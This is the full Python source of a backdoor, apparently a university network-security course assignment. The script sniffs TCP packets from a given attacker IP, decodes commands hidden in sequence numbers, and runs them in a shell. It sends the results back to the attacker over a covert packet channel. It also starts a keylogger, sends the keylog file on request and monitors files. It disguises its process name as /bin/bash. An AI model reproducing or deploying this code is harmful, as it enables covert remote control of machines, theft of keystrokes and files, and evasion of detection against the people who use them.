#!/usr/bin/python3

import optparse
import os
import sys
import time
from packetutil import *
from bkutil import *
from multiprocessing import Process
from cryptoutil import *
from scapy.all import *
from file_monitoring import *
import _thread
import setproctitle
import argparse
import pyxhook
from linuxKey import OnKeyPress

# parse command line argument
arg_parser = argparse.ArgumentParser( 
    prog='Backdoor',
    description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-p', dest='port', type = int, help = 'attackers PORT', default=9999, const=9999, nargs='?')
arg_parser.add_argument('-i', dest='ip', type = str, help = 'attackers IP', required=True)
args = arg_parser.parse_args()

#Global vars
TTL = 234
TTLKEY = 222
attacker = (args.ip, args.port)
messages = []


def secret_send(msg: str, type: str,filename: str="file"):
    """ Sends a file or plain text to attacker device
    
    Arguments:
        msg {str} -- payload being sent
        type {str} -- specifies if content sent is file or command
        filename {str} -- name of file being sent (default:file)
    """

    msg = message_to_bits(msg)
    chunks = message_spliter(msg)
    packets = packatizer(chunks,TTL,attacker)
    send(packets, verbose=True)

    if(type == "command"):
        send(IP(dst=attacker[0], ttl=TTL)/TCP(dport=attacker[1], flags="U"))
    elif(type == "file"):
        send(IP(dst=attacker[0], ttl=TTL)/TCP(dport=attacker[1], flags="P")/Raw(load=encrypt(filename)))


def execPayload(command):
    """executes a command in shell and returns the results

    Arguments:
        command {str} -- A string, or a sequence of program arguments
    """

    # Execute the command
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    result = str(proc.stdout.read() + proc.stderr.read())
    if(result == ""):
        result = "N/A"
    #print(result) DEBUG
    secret_send(result,"command")        

def commandResult(packet):
    """Extracts data from parsed packets
    Packets with flag:
        0x40 - specifys that the packet contains data inside the sequence number
        0x20 - specify end of message and the data is sent for shell execution
        0x08 - specifys a keylog file request 
    Arguments:
        packet {scapy.packet} -- packet to be parsed
    """

    global TTLKEY
    global messages
    ttl = packet[IP].ttl
    if(packet.haslayer(IP) and ttl == TTLKEY):
        # checks if the flag has been set to know it contains the secret results
        flag = packet['TCP'].flags
        if flag == 0x40:
            field = packet[TCP].seq
            covertContent = lengthChecker(field)
            messages.append(text_from_bits(covertContent))
        # End Flag detected
        elif flag == 0x20:
            payload = ''.join(messages)
            execPayload(payload)
            messages = []
        elif flag == 0x08:
            with open('/root/Documents/file.log','r') as f:
                secret_send(f.read(),"file","file.log")



def commandSniffer():
    """filters incoming packets by type and sender. If packets match
    given criteria it is parsed for content
    """

    sniff(filter="tcp and host "+attacker[0], prn=commandResult)


setproctitle.setproctitle("/bin/bash")  # set fake process name

sniffThread = threading.Thread(target=commandSniffer)
fileMonitor = Monitor(addr=attacker) 

#event listner for keyboard press down
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()

new_hook.daemon = True
fileMonitor.daemon = True
sniffThread.daemon = True

new_hook.start()
sniffThread.start()
fileMonitor.start()

while True:
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        #reset()
        print ("Exiting")
        sys.exit(0)
